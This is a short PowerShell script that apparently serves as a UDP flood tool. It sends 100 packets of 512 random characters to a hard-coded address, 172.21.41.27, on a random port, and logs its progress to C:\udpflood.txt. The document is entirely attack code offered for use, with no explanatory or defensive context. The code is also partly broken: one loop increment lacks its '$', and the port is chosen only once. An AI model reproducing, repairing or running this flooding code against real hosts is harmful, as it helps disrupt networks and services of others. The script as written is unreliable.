$udphost="172.21.41.27" ; 
$udpport=0; 
$size=512;
$iteration=100;
$udphost > "C:\\udpflood.txt";

$chars = [String]"ABCDEFGHIJLMNOPQRSTUVWXYZ0123456789abcdefghiklmnopqrstuvwxyz"
$rand = New-Object System.Random
$message = New-Object char[] $size
for ($i=0; $i -lt $size;i++)
{
	$message[$i] = $chars[$rand.Next($chars.length)]
	$i >> "C:\udpflood.txt";
}

$Mess = New-Object System.String ($message, 0, $message.length)

$addr = [System.Net.IPAddress]::Parse($udphost)

#Create Socket!!!
$Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork
$Stype = [System.Net.Sockets.SocketType]::Dgram
$Ptype = [System.Net.Sockets.ProtocolType]::UDP

for ($i=0; $i -lt $iteration; $i++)
{
	if ($udpport -eq 0)
	{
		$r2 = New-Object System.Random;
		$udpport=$r2.Next(65534);
	}

	$End = New-Object System.Net.IPEndPoint $addr, $udpport;



	$Sock = New-Object System.Net.Sockets.Socket $Saddrf, $Stype, $Ptype;
	$Sock.TTL = 26;

	#connect to socket
	$Sock.Connect($End);

	#Conn to socket
	$Enc = [System.Text.Encoding]::ASCII;

	$Buffer = $Enc.GetBytes($Mess);

	#Send the buffer
	
	$Sent = $Sock.Send($Buffer);

	$Sock.Close();
} 


